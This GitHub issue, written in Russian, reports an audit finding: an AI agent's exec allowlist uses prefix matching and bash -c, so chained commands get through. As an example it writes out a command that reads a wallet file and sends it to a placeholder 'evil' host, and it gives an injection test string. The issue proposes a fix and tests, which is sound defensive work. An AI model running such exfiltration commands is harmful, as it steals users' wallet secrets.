---
title: "[AUDIT-FULL-C2] Exec allowlist mode is a prefix match; allowing `\"git\"` allows arbitrary shell"
labels: ["bug", "audit-finding-full", "critical", "security", "command-injection", "v3.0-blocker"]
milestone: "v3.0 - Production Ready"
severity: critical
category: security
effort: small
priority: P0
---

## Источник

Найдено в ходе полного аудита — issue #304, отчёт [`FULL_AUDIT_REPORT.md`](../../FULL_AUDIT_REPORT.md) (FULL-C2).

## Описание

Allowlist сравнивается префиксом по сырой строке, после чего команда целиком передаётся в `bash -c`. Оператор, настроивший `allowlist: ["git"]` с намерением «только git», фактически принимает команды вида `git status && curl http://evil/$(cat ~/.teleton/wallet.json | base64)` — строка начинается с `"git "`, и `bash` выполняет весь pipeline.

## Местоположение

- `src/agent/tools/exec/run.ts:23-30`
  ```ts
  export function isCommandAllowed(command: string, commandAllowlist: string[]): boolean {
    const trimmed = command.trim();
    return commandAllowlist.some((pattern) => {
      const p = pattern.trim();
      return trimmed === p || trimmed.startsWith(p + " ");
    });
  }
  ```
- Runner: `src/agent/tools/exec/runner.ts` → `spawn("bash", ["-c", command])`.

## Влияние

Любая непустая запись allowlist, которая не представляет собой полностью зафиксированную команду с аргументами, эквивалентна `mode: "free"`. Exec выполняется под тем же UID, что и агент, поэтому wallet-файл, Telegram-сессия и memory DB доступны. Для проекта с автономным управлением кошельком это превращает advertised safety gate в foot-gun.

## Предложенное исправление

1. Парсить входящий `command` через `shell-quote`/`shlex`, сравнивать **первый токен точно**. Отказывать, если команда содержит `; & | \` \` $( && || > < \n` в режиме allowlist.
2. В режиме allowlist **не использовать** `bash -c`; выполнять `spawn(tokens[0], tokens.slice(1))` без shell. Явно задокументировать, что allowlist-режим не поддерживает пайпы/редиректы.
3. Добавить тест, утверждающий, что `git status && id` **отклоняется** при `allowlist: ["git"]`.

## Критерии приёмки

- [ ] `isCommandAllowed` использует токенизацию, а не prefix-match.
- [ ] В allowlist-режиме команда исполняется без `bash -c`.
- [ ] Регрессионный тест: `git status && id` отклоняется под `allowlist: ["git"]`.
- [ ] Регрессионный тест: `git status` исполняется корректно.
- [ ] Документация `docs/security.md` / руководство по exec обновлены с ограничениями.

## Оценка

**Effort:** small (≈ 2–4 часа).
**Priority:** P0 — до включения exec в продакшене.
